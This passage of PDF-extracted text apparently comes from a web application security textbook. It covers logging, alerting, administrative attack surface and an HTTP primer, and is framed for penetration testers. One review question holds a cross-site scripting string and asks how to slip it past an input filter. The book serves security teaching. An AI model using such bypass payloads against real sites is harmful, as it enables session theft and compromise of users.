from which the request was received, and the user‚Äôs account (if authenticated). 
Such logs need to be strongly protected against unauthorized read or write 
access. An effective approach is to store audit logs on an autonomous system 
that accepts only update messages from the main application. In some situations, logs may be fl ushed to write-once media to ensure their integrity in the 
event of a successful attack.
In terms of attack surface, poorly protected audit logs can provide a gold mine 
of information to an attacker, disclosing a host of sensitive information such as 
session tokens and request parameters. This information may enable the attacker 
to immediately compromise the entire application, as shown in Figure 2-7.
Figure 2-7: Poorly protected application logs containing sensitive information 
submitted by other users
c02.indd 32 c02.indd 32 8/19/2011 12:02:43 PM 8/19/2011 12:02:43 PM
Stuttard c02.indd V3 - 07/22/2011 Page 33
 Chapter 2 n Core Defense Mechanisms 33
Alerting Administrators
Audit logs enable an application‚Äôs owners to retrospectively investigate intrusion 
attempts and, if possible, take legal action against the perpetrator. However, in 
many situations it is desirable to take much more immediate action, in real time, 
in response to attempted attacks. For example, administrators may block the IP 
address or user account an attacker is using. In extreme cases, they may even 
take the application offl ine while investigating the attack and taking remedial 
action. Even if a successful intrusion has already occurred, its practical effects 
may be mitigated if defensive action is taken at an early stage.
In most situations, alerting mechanisms must balance the confl icting objectives of reporting each genuine attack reliably and of not generating so many 
alerts that these come to be ignored. A well-designed alerting mechanism can 
use a combination of factors to diagnose that a determined attack is under way 
and can aggregate related events into a single alert where possible. Anomalous 
events monitored by alerting mechanisms often include the following:
n Usage anomalies, such as large numbers of requests being received from 
a single IP address or user, indicating a scripted attack
n Business anomalies, such as an unusual number of funds transfers being 
made to or from a single bank account
n Requests containing known attack strings
n Requests where data that is hidden from ordinary users has been modifi ed
Some of these functions can be provided reasonably well by off-the-shelf 
application fi rewalls and intrusion detection products. These typically use a 
mixture of signature- and anomaly-based rules to identify malicious use of 
the application and may reactively block malicious requests as well as issue 
alerts to administrators. These products can form a valuable layer of defense 
protecting a web application, particularly in the case of existing applications 
known to contain problems but where resources to fi x these are not immediately available. However, their effectiveness usually is limited by the fact that 
each web application is different, so the rules employed are inevitably generic 
to some extent. Web application fi rewalls usually are good at identifying the 
most obvious attacks, where an attacker submits standard attack strings in 
each request parameter. However, many attacks are more subtle than this. For 
example, perhaps they modify the account number in a hidden fi eld to access 
another user‚Äôs data, or submit requests out of sequence to exploit defects in the 
application‚Äôs logic. In these cases, a request submitted by an attacker may be 
c02.indd 33 c02.indd 33 8/19/2011 12:02:43 PM 8/19/2011 12:02:43 PM
Stuttard c02.indd V3 - 07/22/2011 Page 34
34 Chapter 2 n Core Defense Mechanisms
identical to that submitted by a benign user. What makes it malicious are the 
circumstances under which it is made.
In any security-critical application, the most effective way to implement realtime alerting is to integrate this tightly with the application‚Äôs input validation 
mechanisms and other controls. For example, if a cookie is expected to have 
one of a specifi c set of values, any violation of this indicates that its value has 
been modifi ed in a way that is not possible for ordinary users of the application. 
Similarly, if a user changes an account number in a hidden fi eld to identify a 
different user‚Äôs account, this strongly indicates malicious intent. The application 
should already be checking for these attacks as part of its primary defenses, 
and these protective mechanisms can easily hook into the application‚Äôs alerting mechanism to provide fully customized indicators of malicious activity. 
Because these checks have been tailored to the application‚Äôs actual logic, with 
a fi ne-grained knowledge of how ordinary users should be behaving, they 
are much less prone to false positives than any off-the-shelf solution, however 
confi gurable or easy-to-learn that solution may be.
Reacting to Attacks
In addition to alerting administrators, many security-critical applications contain built-in mechanisms to react defensively to users who are identifi ed as 
potentially malicious.
Because each application is different, most real-world attacks require an 
attacker to probe systematically for vulnerabilities, submitting numerous requests 
containing crafted input designed to indicate the presence of various common 
vulnerabilities. Effective input validation mechanisms will identify many of 
these requests as potentially malicious and block the input from having any 
undesirable effect on the application. However, it is sensible to assume that 
some bypasses to these fi lters exist and that the application does contain some 
actual vulnerabilities waiting to be discovered and exploited. At some point, an 
attacker working systematically is likely to discover these defects.
For this reason, some applications take automatic reactive measures to frustrate the activities of an attacker who is working in this way. For example, they 
might respond increasingly slowly to the attacker‚Äôs requests or terminate the 
attacker‚Äôs session, requiring him to log in or perform other steps before continuing the attack. Although these measures will not defeat the most patient 
and determined attacker, they will deter many more casual attackers and will 
buy additional time for administrators to monitor the situation and take more 
drastic action if desired.
c02.indd 34 c02.indd 34 8/19/2011 12:02:43 PM 8/19/2011 12:02:43 PM
Stuttard c02.indd V3 - 07/22/2011 Page 35
 Chapter 2 n Core Defense Mechanisms 35
Reacting to apparent attackers is not, of course, a substitute for fi xing any 
vulnerabilities that exist within the application. However, in the real world, even 
the most diligent efforts to purge an application of security fl aws may leave 
some exploitable defects. Placing further obstacles in the way of an attacker 
is an effective defense-in-depth measure that reduces the likelihood that any 
residual vulnerabilities will be found and exploited.
Managing the Application
Any useful application needs to be managed and administered. This facility 
often forms a key part of the application‚Äôs security mechanisms, providing a 
way for administrators to manage user accounts and roles, access monitoring 
and audit functions, perform diagnostic tasks, and confi gure aspects of the 
application‚Äôs functionality.
In many applications, administrative functions are implemented within 
the application itself, accessible through the same web interface as its core 
nonsecurity functionality, as shown in Figure 2-8. Where this is the case, the 
administrative mechanism represents a critical part of the application‚Äôs attack 
surface. Its primary attraction for an attacker is as a vehicle for privilege escalation. For example:
n Weaknesses in the authentication mechanism may enable an attacker 
to gain administrative access, effectively compromising the entire 
application.
n Many applications do not implement effective access control of some of 
their administrative functions. An attacker may fi nd a means of creating 
a new user account with powerful privileges.
n Administrative functionality often involves displaying data that originated 
from ordinary users. Any cross-site scripting fl aws within the administrative interface can lead to compromise of a user session that is guaranteed 
to have powerful privileges.
n Administrative functionality is often subjected to less rigorous security 
testing, because its users are deemed to be trusted, or because penetration 
testers are given access to only low-privileged accounts. Furthermore, the 
functionality often needs to perform inherently dangerous operations, 
involving access to fi les on disk or operating system commands. If an 
attacker can compromise the administrative function, he can often leverage it to take control of the entire server.
c02.indd 35 c02.indd 35 8/19/2011 12:02:43 PM 8/19/2011 12:02:43 PM
Stuttard c02.indd V3 - 07/22/2011 Page 36
36 Chapter 2 n Core Defense Mechanisms
Figure 2-8: An administrative interface within a web application
Summary
Despite their extensive differences, virtually all web applications employ the 
same core security mechanisms in some shape or form. These mechanisms represent an application‚Äôs primary defenses against malicious users and therefore 
also comprise the bulk of the application‚Äôs attack surface. The vulnerabilities 
we will examine later in this book mainly arise from defects within these core 
mechanisms.
Of these components, the mechanisms for handling user access and user input 
are the most important and should receive most of your attention when you are 
targeting an application. Defects in these mechanisms often lead to complete 
compromise of the application, enabling you to access data belonging to other 
users, perform unauthorized actions, and inject arbitrary code and commands.
Questions
Answers can be found at http://mdsec.net/wahh.
 1. Why are an application‚Äôs mechanisms for handling user access only as 
strong as the weakest of these components?
 2. What is the difference between a session and a session token?
 3. Why is it not always possible to use a whitelist-based approach to input 
validation?
c02.indd 36 c02.indd 36 8/19/2011 12:02:43 PM 8/19/2011 12:02:43 PM
Stuttard c02.indd V3 - 07/22/2011 Page 37
 Chapter 2 n Core Defense Mechanisms 37
 4. You are attacking an application that implements an administrative function. You do not have any valid credentials to use the function. Why should 
you nevertheless pay close attention to it?
 5. An input validation mechanism designed to block cross-site scripting 
attacks performs the following sequence of steps on an item of input:
 1. Strip any <script> expressions that appear.
 2. Truncate the input to 50 characters.
 3. Remove any quotation marks within the input.
 4. URL-decode the input.
 5. If any items were deleted, return to step 1.
Can you bypass this validation mechanism to smuggle the following data 
past it?
‚Äú><script>alert(‚Äúfoo‚Äù)</script>
c02.indd 37 c02.indd 37 8/19/2011 12:02:44 PM 8/19/2011 12:02:44 PM
Stuttard c02.indd V3 - 07/22/2011 Page 38
c02.indd 38 c02.indd 38 8/19/2011 12:02:44 PM 8/19/2011 12:02:44 PM
Stuttard c03.indd V3 - 07/22/2011 Page 39
39
 C H A P T E R 
3
Web Application Technologies
Web applications employ a myriad of technologies to implement their functionality. This chapter is a short primer on the key technologies that you are likely 
to encounter when attacking web applications. We will examine the HTTP 
protocol, the technologies commonly employed on the server and client sides, 
and the encoding schemes used to represent data in different situations. These 
technologies are in general easy to understand, and a grasp of their relevant 
features is key to performing effective attacks against web applications.
If you are already familiar with the key technologies used in web applications, 
you can skim through this chapter to confi rm that it offers you nothing new. If 
you are still learning how web applications work, you should read this chapter 
before continuing to the later chapters on specifi c vulnerabilities. For further 
reading on many of the areas covered, we recommend HTTP: The Defi nitive
Guide by David Gourley and Brian Totty (O‚ÄôReilly, 2002), and also the website 
of the World Wide Web Consortium at www.w3.org.
The HTTP Protocol
Hypertext transfer protocol (HTTP) is the core communications protocol used to 
access the World Wide Web and is used by all of today‚Äôs web applications. It is 
a simple protocol that was originally developed for retrieving static text-based 
resources. It has since been extended and leveraged in various ways to enable 
it to support the complex distributed applications that are now commonplace.
c03.indd 39 c03.indd 39 8/19/2011 12:03:43 PM 8/19/2011 12:03:43 PM
Stuttard c03.indd V3 - 07/22/2011 Page 40
40 Chapter 3 n Web Application Technologies
HTTP uses a message-based model in which a client sends a request message and the server returns a response message. The protocol is essentially 
connectionless: although HTTP uses the stateful TCP protocol as its transport 
mechanism, each exchange of request and response is an autonomous transaction and may use a different TCP connection.
HTTP Requests
All HTTP messages (requests and responses) consist of one or more headers, 
each on a separate line, followed by a mandatory blank line, followed by an 
optional message body. A typical HTTP request is as follows:
GET /auth/488/YourDetails.ashx?uid=129 HTTP/1.1
Accept: application/x-ms-application, image/jpeg, application/xaml+xml, 
image/gif, image/pjpeg, application/x-ms-xbap, application/x-shockwaveflash, */*
Referer: https://mdsec.net/auth/488/Home.ashx
Accept-Language: en-GB
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; 
Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 
3.0.30729; .NET4.0C; InfoPath.3; .NET4.0E; FDM; .NET CLR 1.1.4322)
Accept-Encoding: gzip, deflate
Host: mdsec.net
Connection: Keep-Alive
Cookie: SessionId=5B70C71F3FD4968935CDB6682E545476
The fi rst line of every HTTP request consists of three items, separated by spaces:
n A verb indicating the HTTP method. The most commonly used method 
is GET, whose function is to retrieve a resource from the web server. GET
requests do not have a message body, so no further data follows the blank 
line after the message headers.
n The requested URL. The URL typically functions as a name for the resource 
being requested, together with an optional query string containing parameters that the client is passing to that resource. The query string is indicated 
by the ? character in the URL. The example contains a single parameter 
with the name uid and the value 129.
n The HTTP version being used. The only HTTP versions in common use 
on the Internet are 1.0 and 1.1, and most browsers use version 1.1 by 
default. There are a few differences between the specifi cations of these 
two versions; however, the only difference you are likely to encounter 
when attacking web applications is that in version 1.1 the Host request 
header is mandatory.
c03.indd 40 c03.indd 40 8/19/2011 12:03:43 PM 8/19/2011 12:03:43 PM
Stuttard c03.indd V3 - 07/22/2011 Page 41
 Chapter 3 n Web Application Technologies 41
Here are some other points of interest in the sample request:
n The Referer header is used to indicate the URL from which the request 
originated (for example, because the user clicked a link on that page). 
Note that this header was misspelled in the original HTTP specifi cation, 
and the misspelled version has been retained ever since.
n The User-Agent header is used to provide information about the browser 
or other client software that generated the request. Note that most browsers include the Mozilla prefi x for historical reasons. This was the UserAgent string used by the originally dominant Netscape browser, and other 
browsers wanted to assert to websites that they were compatible with this 
standard. As with many quirks from computing history, it has become so 
established that it is still retained, even on the current version of Internet 
Explorer, which made the request shown in the example.
n The Host header specifi es the hostname that appeared in the full URL 
being accessed. This is necessary when multiple websites are hosted on 
the same server, because the URL sent in the fi rst line of the request usually does not contain a hostname. (See Chapter 17 for more information 
about virtually hosted websites.)
n The Cookie header is used to submit additional parameters that the server 
has issued to the client (described in more detail later in this chapter).
HTTP Responses
A typical HTTP response is as follows:
HTTP/1.1 200 OK
Date: Tue, 19 Apr 2011 09:23:32 GMT
Server: Microsoft-IIS/6.0
X-Powered-By: ASP.NET
Set-Cookie: tracking=tI8rk7joMx44S2Uu85nSWc
X-AspNet-Version: 2.0.50727
Cache-Control: no-cache
Pragma: no-cache
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1067
<!DOCTYPE html PUBLIC ‚Äú-//W3C//DTD XHTML 1.0 Transitional//EN‚Äù ‚Äúhttp://
www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd‚Äù><html xmlns=‚Äùhttp://
www.w3.org/1999/xhtml‚Äù ><head><title>Your details</title>
...
c03.indd 41 c03.indd 41 8/19/2011 12:03:43 PM 8/19/2011 12:03:43 PM
Stuttard c03.indd V3 - 07/22/2011 Page 42
42 Chapter 3 n Web Application Technologies
The fi rst line of every HTTP response consists of three items, separated by 
spaces:
n The HTTP version being used.
n A numeric status code indicating the result of the request. 200 is the most 
common status code; it means that the request was successful and that 
the requested resource is being returned.
n A textual ‚Äúreason phrase‚Äù further describing the status of the response. This 
can have any value and is not used for any purpose by current browsers.
Here are some other points of interest in the response:
n The Server header contains a banner indicating the web server software 
being used, and sometimes other details such as installed modules and 
the server operating system. The information contained may or may not 
be accurate.
n The Set-Cookie header issues the browser a further cookie; this is submitted back in the Cookie header of subsequent requests to this server.
n The Pragma header instructs the browser not to store the response in its 
cache. The Expires header indicates that the response content expired 
in the past and therefore should not be cached. These instructions are 
frequently issued when dynamic content is being returned to ensure 
that browsers obtain a fresh version of this content on subsequent 
occasions.
n Almost all HTTP responses contain a message body following the blank 
line after the headers. The Content-Type header indicates that the body 
of this message contains an HTML document.
n The Content-Length header indicates the length of the message body in 
bytes.
HTTP Methods
When you are attacking web applications, you will be dealing almost exclusively 
with the most commonly used methods: GET and POST. You need to be aware 
of some important differences between these methods, as they can affect an 
application‚Äôs security if overlooked.
The GET method is designed to retrieve resources. It can be used to send 
parameters to the requested resource in the URL query string. This enables 
users to bookmark a URL for a dynamic resource that they can reuse. Or other 
users can retrieve the equivalent resource on a subsequent occasion (as in a 
bookmarked search query). URLs are displayed on-screen and are logged in 
various places, such as the browser history and the web server‚Äôs access logs. 
They are also transmitted in the Referer header to other sites when external 
c03.indd 42 c03.indd 42 8/19/2011 12:03:43 PM 8/19/2011 12:03:43 PM
Stuttard c03.indd V3 - 07/22/2011 Page 43
 Chapter 3 n Web Application Technologies 43
links are followed. For these reasons, the query string should not be used to 
transmit any sensitive information.
The POST method is designed to perform actions. With this method, request 
parameters can be sent both in the URL query string and in the body of the 
message. Although the URL can still be bookmarked, any parameters sent in 
the message body will be excluded from the bookmark. These parameters will 
also be excluded from the various locations in which logs of URLs are maintained and from the Referer header. Because the POST method is designed for 
performing actions, if a user clicks the browser‚Äôs Back button to return to a 
page that was accessed using this method, the browser does not automatically 
reissue the request. Instead, it warns the user of what it is about to do, as shown 
in Figure 3-1. This prevents users from unwittingly performing an action more 
than once. For this reason, POST requests should always be used when an action 
is being performed.
Figure 3-1: Browsers do not automatically reissue POST requests made by 
users, because these might cause an action to be performed more than once
In addition to the GET and POST methods, the HTTP protocol supports numerous other methods that have been created for specifi c purposes. Here are the 
other ones you are most likely to require knowledge of:
n HEAD functions in the same way as a GET request, except that the server 
should not return a message body in its response. The server should return 
the same headers that it would have returned to the corresponding GET
request. Hence, this method can be used to check whether a resource is 
present before making a GET request for it.
n TRACE is designed for diagnostic purposes. The server should return in the 
response body the exact contents of the request message it received. This 
can be used to detect the effect of any proxy servers between the client 
and server that may manipulate the request.
n OPTIONS asks the server to report the HTTP methods that are available for 
a particular resource. The server typically returns a response containing 
an Allow header that lists the available methods.
n PUT attempts to upload the specifi ed resource to the server, using the content contained in the body of the request. If this method is enabled, you 
may be able to leverage it to attack the application, such as by uploading 
an arbitrary script and executing it on the server.
c03.indd 43 c03.indd 43 8/19/2011 12:03:44 PM 8/19/2011 12:03:44 PM
Stuttard c03.indd V3 - 07/22/2011 Page 44
44 Chapter 3 n Web Application Technologies
Many other HTTP methods exist that are not directly relevant to attacking 
web applications. However, a web server may expose itself to attack if certain 
dangerous methods are available. See Chapter 18 for further details on these 
methods and examples of using them in an attack.
URLs
A uniform resource locator (URL) is a unique identifi er for a web resource through 
which that resource can be retrieved. The format of most URLs is as follows:
protocol://hostname[:port]/[path/]file[?param=value]
Several components in this scheme are optional. The port number usually is 
included only if it differs from the default used by the relevant protocol. The 
URL used to generate the HTTP request shown earlier is as follows:
https://mdsec.net/auth/488/YourDetails.ashx?uid=129
In addition to this absolute form, URLs may be specifi ed relative to a particular 
host, or relative to a particular path on that host. For example:
/auth/488/YourDetails.ashx?uid=129
YourDetails.ashx?uid=129
These relative forms are often used in web pages to describe navigation within 
the website or application itself.
NOTE You may encounter the term URI (or uniform resource identifi er) 
being used instead of URL, but it is really only used in formal specifi cations 
and by those who want to exhibit their pedantry.
REST
Representational state transfer (REST) is a style of architecture for distributed 
systems in which requests and responses contain representations of the current 
state of the system‚Äôs resources. The core technologies employed in the World 
Wide Web, including the HTTP protocol and the format of URLs, conform to 
the REST architectural style.
Although URLs containing parameters within the query string do themselves 
conform to REST constraints, the term ‚ÄúREST-style URL‚Äù is often used to signify 
a URL that contains its parameters within the URL fi le path, rather than the 
query string. For example, the following URL containing a query string:
http://wahh-app.com/search?make=ford&model=pinto
corresponds to the following URL containing ‚ÄúREST-style‚Äù parameters:
http://wahh-app.com/search/ford/pinto
c03.indd 44 c03.indd 44 8/19/2011 12:03:44 PM 8/19/2011 12:03:44 PM
Stuttard c03.indd V3 - 07/22/2011 Page 45
 Chapter 3 n Web Application Technologies 45
Chapter 4 describes how you need to consider these different parameter styles 
when mapping an application‚Äôs content and functionality and identifying its 
key attack surface.
HTTP Headers
HTTP supports a large number of headers, some of which are designed for 
specifi c unusual purposes. Some headers can be used for both requests and 
responses, and others are specifi c to one of these message types. The following 
sections describe the headers you are likely to encounter when attacking web 
applications.
General Headers
n Connection tells the other end of the communication whether it should 
close the TCP connection after the HTTP transmission has completed or 
keep it open for further messages.
n Content-Encoding specifi es what kind of encoding is being used for the 
content contained in the message body, such as gzip, which is used by 
some applications to compress responses for faster transmission.
n Content-Length specifi es the length of the message body, in bytes (except 
in the case of responses to HEAD requests, when it indicates the length of 
the body in the response to the corresponding GET request).
n Content-Type specifi es the type of content contained in the message body, 
such as text/html for HTML documents.
n Transfer-Encoding specifi es any encoding that was performed on the 
message body to facilitate its transfer over HTTP. It is normally used to 
specify chunked encoding when this is employed.
Request Headers
n Accept tells the server what kinds of content the client is willing to accept, 
such as image types, offi ce document formats, and so on.
n Accept-Encoding tells the server what kinds of content encoding the client 
is willing to accept.
n Authorization submits credentials to the server for one of the built-in 
HTTP authentication types.
n Cookie submits cookies to the server that the server previously issued.
n Host specifi es the hostname that appeared in the full URL being requested.
c03.indd 45 c03.indd 45 8/19/2011 12:03:44 PM 8/19/2011 12:03:44 PM
Stuttard c03.indd V3 - 07/22/2011 Page 46
46 Chapter 3 n Web Application Technologies
n If-Modified-Since specifi es when the browser last received the requested 
resource. If the resource has not changed since that time, the server may 
instruct the client to use its cached copy, using a response with status code 304.
n If-None-Match specifi es an entity tag, which is an identifi er denoting the 
contents of the message body. The browser submits the entity tag that 
the server issued with the requested resource when it was last received. 
The server can use the entity tag to determine whether the browser may 
use its cached copy of the resource.
n Origin is used in cross-domain Ajax requests to indicate the domain from 
which the request originated (see Chapter 13).
n Referer specifi es the URL from which the current request originated.
n User-Agent provides information about the browser or other client software that generated the request.
Response Headers
n Access-Control-Allow-Origin indicates whether the resource can be 
retrieved via cross-domain Ajax requests (see Chapter 13).
n Cache-Control passes caching directives to the browser (for example, 
no-cache).
n ETag specifi es an entity tag. Clients can submit this identifi er in future 
requests for the same resource in the If-None-Match header to notify the 
server which version of the resource the browser currently holds in its cache.
n Expires tells the browser for how long the contents of the message body 
are valid. The browser may use the cached copy of this resource until 
this time.
n Location is used in redirection responses (those that have a status code 
starting with 3) to specify the target of the redirect.
n Pragma passes caching directives to the browser (for example, no-cache).
n Server provides information about the web server software being used.
n Set-Cookie issues cookies to the browser that it will submit back to the 
server in subsequent requests.
n WWW-Authenticate is used in responses that have a 401 status code to 
provide details on the type(s) of authentication that the server supports.
n X-Frame-Options indicates whether and how the current response may 
be loaded within a browser frame (see Chapter 13).
c03.indd 46 c03.indd 46 8/19/2011 12:03:44 PM 8/19/2011 12:03:44 PM
Stuttard c03.indd V3 - 07/22/2011 Page 47
 Chapter 3 n Web Application Technologies 47
Cookies
Cookies are a key part of the HTTP protocol that most web applications rely 
on. Frequently they can be used as a vehicle for exploiting vulnerabilities. The 
cookie mechanism enables the server to send items of data to the client, which 
the client stores and resubmits to the server. Unlike the other types of request 
parameters (those within the URL query string or the message body), cookies 
continue to be resubmitted in each subsequent request without any particular 
action required by the application or the user.
A server issues a cookie using the Set-Cookie response header, as you 
have seen:
Set-Cookie: tracking=tI8rk7joMx44S2Uu85nSWc
The user‚Äôs browser then automatically adds the following header to subsequent 
requests back to the same server:
Cookie: tracking=tI8rk7joMx44S2Uu85nSWc
Cookies normally consist of a name/value pair, as shown, but they may consist 
of any string that does not contain a space. Multiple cookies can be issued by 
using multiple Set-Cookie headers in the server‚Äôs response. These are submitted back to the server in the same Cookie header, with a semicolon separating 
different individual cookies.
In addition to the cookie‚Äôs actual value, the Set-Cookie header can include 
any of the following optional attributes, which can be used to control how the 
browser handles the cookie:
n expires sets a date until which the cookie is valid. This causes the browser 
to save the cookie to persistent storage, and it is reused in subsequent 
browser sessions until the expiration date is reached. If this attribute is 
not set, the cookie is used only in the current browser session.
n domain specifi es the domain for which the cookie is valid. This must be 
the same or a parent of the domain from which the cookie is received.
n path specifi es the URL path for which the cookie is valid.
n secure ‚Äî If this attribute is set, the cookie will be submitted only in HTTPS 
requests.
n HttpOnly ‚Äî If this attribute is set, the cookie cannot be directly accessed 
via client-side JavaScript.
Each of these cookie attributes can impact the application‚Äôs security. The 
primary impact is on the attacker‚Äôs ability to directly target other users of the 
application. See Chapters 12 and 13 for more details.
c03.indd 47 c03.indd 47 8/19/2011 12:03:44 PM 8/19/2011 12:03:44 PM
Stuttard c03.indd V3 - 07/22/2011 Page 48
48 Chapter 3 n Web Application Technologies
Status Codes
Each HTTP response message must contain a status code in its fi rst line, indicating the result of the request. The status codes fall into fi ve groups, according 
to the code‚Äôs fi rst digit:
n 1xx ‚Äî Informational.
n 2xx ‚Äî The request was successful.
n 3xx ‚Äî The client is redirected to a different resource.
n 4xx ‚Äî The request contains an error of some kind.
n 5xx ‚Äî The server encountered an error fulfi lling the request.
There are numerous specifi c status codes, many of which are used only in 
specialized circumstances. Here are the status codes you are most likely to 
encounter when attacking a web application, along with the usual reason phrase 
associated with them:
n 100 Continue is sent in some circumstances when a client submits a 
request containing a body. The response indicates that the request headers 
were received and that the client should continue sending the body. The 
server returns a second response when the request has been completed.
n 200 OK indicates that the request was successful and that the response 
body contains the result of the request.
n 201 Created is returned in response to a PUT request to indicate that the 
request was successful.
n 301 Moved Permanently redirects the browser permanently to a different 
URL, which is specifi ed in the Location header. The client should use the 
new URL in the future rather than the original.
n 302 Found redirects the browser temporarily to a different URL, which is 
specifi ed in the Location header. The client should revert to the original 
URL in subsequent requests.
n 304 Not Modified instructs the browser to use its cached copy of the 
requested resource. The server uses the If-Modified-Since and If-NoneMatch request headers to determine whether the client has the latest version 
of the resource.
n 400 Bad Request indicates that the client submitted an invalid HTTP request. 
You will probably encounter this when you have modifi ed a request in 
certain invalid ways, such as by placing a space character into the URL.
n 401 Unauthorized indicates that the server requires HTTP authentication 
before the request will be granted. The WWW-Authenticate header contains 
details on the type(s) of authentication supported.
c03.indd 48 c03.indd 48 8/19/2011 12:03:44 PM 8/19/2011 12:03:44 PM
Stuttard c03.indd V3 - 07/22/2011 Page 49
 Chapter 3 n Web Application Technologies 49
n 403 Forbidden indicates that no one is allowed to access the requested 
resource, regardless of authentication.
n 404 Not Found indicates that the requested resource does not exist.
n 405 Method Not Allowed indicates that the method used in the request is 
not supported for the specifi ed URL. For example, you may receive this 
status code if you attempt to use the PUT method where it is not supported.
n 413 Request Entity Too Large ‚Äî If you are probing for buffer overfl ow 
vulnerabilities in native code, and therefore are submitting long strings 
of data, this indicates that the body of your request is too large for the 
server to handle.
n 414 Request URI Too Long is similar to the 413 response. It indicates that 
the URL used in the request is too large for the server to handle.
n 500 Internal Server Error indicates that the server encountered an 
error fulfi lling the request. This normally occurs when you have submitted unexpected input that caused an unhandled error somewhere within 
the application‚Äôs processing. You should closely review the full contents 
of the server‚Äôs response for any details indicating the nature of the error.
n 503 Service Unavailable normally indicates that, although the web 
server itself is functioning and can respond to requests, the application 
accessed via the server is not responding. You should verify whether this 
is the result of any action you have performed.
HTTPS
The HTTP protocol uses plain TCP as its transport mechanism, which is unencrypted and therefore can be intercepted by an attacker who is suitably positioned on the network. HTTPS is essentially the same application-layer protocol 
as HTTP but is tunneled over the secure transport mechanism, Secure Sockets 
Layer (SSL). This protects the privacy and integrity of data passing over the 
network, reducing the possibilities for noninvasive interception attacks. HTTP 
requests and responses function in exactly the same way regardless of whether 
SSL is used for transport.
NOTE SSL has strictly been superseded by transport layer security (TLS), but 
the latter usually still is referred to using the older name.
HTTP Proxies
An HTTP proxy is a server that mediates access between the client browser and 
the destination web server. When a browser has been confi gured to use a proxy 
c03.indd 49 c03.indd 49 8/19/2011 12:03:44 PM 8/19/2011 12:03:44 PM
Stuttard c03.indd V3 - 07/22/2011 Page 50
50 Chapter 3 n Web Application Technologies
server, it makes all its requests to that server. The proxy relays the requests to 
the relevant web servers and forwards their responses back to the browser. 
Most proxies also provide additional services, including caching, authentication, and access control.
You should be aware of two differences in how HTTP works when a proxy 
server is being used:
n When a browser issues an unencrypted HTTP request to a proxy server, it 
places the full URL into the request, including the protocol prefi x http://,
the server‚Äôs hostname, and the port number if this is nonstandard. The 
proxy server extracts the hostname and port and uses these to direct the 
request to the correct destination web server.
n When HTTPS is being used, the browser cannot perform the SSL handshake with the proxy server, because this would break the secure tunnel 
and leave the communications vulnerable to interception attacks. Hence, 
the browser must use the proxy as a pure TCP-level relay, which passes 
all network data in both directions between the browser and the destination web server, with which the browser performs an SSL handshake as 
normal. To establish this relay, the browser makes an HTTP request to the 
proxy server using the CONNECT method and specifying the destination 
hostname and port number as the URL. If the proxy allows the request, 
it returns an HTTP response with a 200 status, keeps the TCP connection 
open, and from that point onward acts as a pure TCP-level relay to the 
destination web server.
By some measure, the most useful item in your toolkit when attacking web 
applications is a specialized kind of proxy server that sits between your browser 
and the target website and allows you to intercept and modify all requests and 
responses, even those using HTTPS. We will begin examining how you can use 
this kind of tool in the next chapter.
HTTP Authentication
The HTTP protocol includes its own mechanisms for authenticating users using 
various authentication schemes, including the following:
n Basic is a simple authentication mechanism that sends user credentials as 
a Base64-encoded string in a request header with each message.
n NTLM is a challenge-response mechanism and uses a version of the 
Windows NTLM protocol.
n Digest is a challenge-response mechanism and uses MD5 checksums of 
a nonce with the user‚Äôs credentials.
c03.indd 50 c03.indd 50 8/19/2011 12:03:44 PM 8/19/2011 12:03:44 PM
Stuttard c03.indd V3 - 07/22/2011 Page 51
 Chapter 3 n Web Application Technologies 51
It is relatively rare to encounter these authentication protocols being used 
by web applications deployed on the Internet. They are more commonly used 
within organizations to access intranet-based services.
COMMON MYTH
‚ÄúBasic authentication is insecure.‚Äù
Because basic authentication places credentials in unencrypted form within 
the HTTP request, it is frequently stated that the protocol is insecure and 
should not be used. But forms-based authentication, as used by numerous 
banks, also places credentials in unencrypted form within the HTTP request.
Any HTTP message can be protected from eavesdropping attacks by using HTTPS 
as a transport mechanism, which should be done by every security-conscious 
application. In relation to eavesdropping, at least, basic authentication in itself 
is no worse than the methods used by the majority of today‚Äôs web applications.
Web Functionality
In addition to the core communications protocol used to send messages between 
client and server, web applications employ numerous technologies to deliver 
their functionality. Any reasonably functional application may employ dozens 
of distinct technologies within its server and client components. Before you can 
mount a serious attack against a web application, you need a basic understanding of how its functionality is implemented, how the technologies used are 
designed to behave, and where their weak points are likely to lie.
Server-Side Functionality
The early World Wide Web contained entirely static content. Websites consisted of various resources such as HTML pages and images, which were 
simply loaded onto a web server and delivered to any user who requested 
them. Each time a particular resource was requested, the server responded 
with the same content.
Today‚Äôs web applications still typically employ a fair number of static resources. 
However, a large amount of the content that they present to users is generated 
dynamically. When a user requests a dynamic resource, the server‚Äôs response 
is created on the fl y, and each user may receive content that is uniquely customized for him or her.
Dynamic content is generated by scripts or other code executing on the server. 
These scripts are akin to computer programs in their own right. They have various inputs, perform processing on these, and return their outputs to the user.
c03.indd 51 c03.indd 51 8/19/2011 12:03:44 PM 8/19/2011 12:03:44 PM
Stuttard c03.indd V3 - 07/22/2011 Page 52
52 Chapter 3 n Web Application Technologies
When a user‚Äôs browser requests a dynamic resource, normally it does not 
simply ask for a copy of that resource. In general, it also submits various 
parameters along with its request. It is these parameters that enable the serverside application to generate content that is tailored to the individual user. 
HTTP requests can be used to send parameters to the application in three 
main ways:
n In the URL query string
n In the fi le path of REST-style URLs
n In HTTP cookies
n In the body of requests using the POST method
In addition to these primary sources of input, the server-side application may 
in principle use any part of the HTTP request as an input to its processing. For 
example, an application may process the User-Agent header to generate content 
that is optimized for the type of browser being used.
Like computer software in general, web applications employ a wide range of 
technologies on the server side to deliver their functionality:
n Scripting languages such as PHP, VBScript, and Perl
n Web application platforms such as ASP.NET and Java
n Web servers such as Apache, IIS, and Netscape Enterprise
n Databases such as MS-SQL, Oracle, and MySQL
n Other back-end components such as fi lesystems, SOAP-based web services, 
and directory services
All these technologies and the types of vulnerabilities that can arise in relation to them are examined in detail throughout this book. Some of the most 
common web application platforms and technologies you are likely to encounter 
are described in the following sections.
COMMON MYTH
‚ÄúOur applications need only cursory security review, because they employ a 
well-used framework.‚Äù
Use of a well-used framework is often a cause for complacency in web 
application development, on the assumption that common vulnerabilities 
such as SQL injection are automatically avoided. This assumption is mistaken 
for two reasons.
First, a large number of web application vulnerabilities arise in an application‚Äôs design, not its implementation, and are independent of the development 
framework or language chosen.
